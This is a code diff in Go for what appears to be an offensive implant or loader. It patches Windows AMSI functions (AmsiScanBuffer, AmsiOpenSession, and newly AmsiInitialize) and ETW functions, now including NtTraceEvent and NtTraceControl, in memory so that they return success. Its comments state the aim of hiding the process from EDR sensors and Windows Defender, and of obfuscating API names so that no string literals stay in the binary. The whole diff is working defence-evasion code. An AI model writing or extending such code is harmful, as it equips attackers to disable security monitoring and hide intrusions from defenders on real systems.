@@ -46,26 +46,39 @@ func patchNtdllFunc(name string, patch []byte) {
 	applyMemPatch(proc.Addr(), patch)
 }
 
-// patchAMSI patches AmsiScanBuffer and AmsiOpenSession so every AMSI scan
-// returns AMSI_RESULT_CLEAN (0) and sessions silently appear to succeed.
+// patchAMSI patches AmsiScanBuffer, AmsiOpenSession, and AmsiInitialize so
+// every AMSI scan returns AMSI_RESULT_CLEAN (0), sessions silently appear to
+// succeed, and any attempt to register a new AMSI provider (e.g. a late-loaded
+// Defender component) also silently fails.
 // DLL and proc names are built from byte arrays — no string literals in binary.
 func patchAMSI() {
 	amsi := windows.NewLazySystemDLL(sAmsiDLL())
-	// AmsiScanBuffer → xor eax,eax; ret  (AMSI_RESULT_CLEAN = 0)
-	scanProc := amsi.NewProc(sAmsiScanBuffer())
-	if scanProc.Find() == nil {
-		applyMemPatch(scanProc.Addr(), []byte{0x31, 0xC0, 0xC3})
+	p := []byte{0x31, 0xC0, 0xC3} // xor eax,eax; ret
+	// AmsiScanBuffer → AMSI_RESULT_CLEAN = 0
+	scan := amsi.NewProc(sAmsiScanBuffer())
+	if scan.Find() == nil {
+		applyMemPatch(scan.Addr(), p)
 	}
-	// AmsiOpenSession → xor eax,eax; ret  (S_OK = 0, NULL session handle)
-	sessionProc := amsi.NewProc(sAmsiOpenSession())
-	if sessionProc.Find() == nil {
-		applyMemPatch(sessionProc.Addr(), []byte{0x31, 0xC0, 0xC3})
+	// AmsiOpenSession → S_OK = 0
+	sess := amsi.NewProc(sAmsiOpenSession())
+	if sess.Find() == nil {
+		applyMemPatch(sess.Addr(), p)
+	}
+	// AmsiInitialize → S_OK = 0: prevents any new AMSI provider from initialising.
+	init_ := amsi.NewProc(sAmsiInitialize())
+	if init_.Find() == nil {
+		applyMemPatch(init_.Addr(), p)
 	}
 }
 
-// patchETW patches the four ETW write functions so the process emits no ETW
-// events visible to EDR sensors.  All use "xor eax,eax; ret" (STATUS_SUCCESS)
-// rather than bare "ret" so callers that check the return value don't fault.
+// patchETW patches the ETW write and trace-control functions so the process
+// emits no ETW events visible to EDR sensors.  All use "xor eax,eax; ret"
+// (STATUS_SUCCESS) rather than bare "ret" so callers that check the return
+// value don't fault.
+//
+// NtTraceEvent and NtTraceControl are additional kernel-routed ETW paths used
+// by Windows Defender's real-time protection and ETW-TI; silencing them cuts
+// off a channel that patchETW's user-mode Etw* patches do not cover.
 func patchETW() {
 	// 31 C0 C3 — xor eax,eax; ret  (NTSTATUS 0 = STATUS_SUCCESS)
 	p := []byte{0x31, 0xC0, 0xC3}
@@ -73,6 +86,8 @@ func patchETW() {
 	patchNtdllFunc(sEtwEventWriteFull(), p)
 	patchNtdllFunc(sEtwEventWriteEx(), p)
 	patchNtdllFunc(sEtwEventWriteTransfer(), p)
+	patchNtdllFunc(sNtTraceEvent(), p)
+	patchNtdllFunc(sNtTraceControl(), p)
 }
 
 // patchEtwRegister patches EtwEventRegister → ret so any future ETW provider
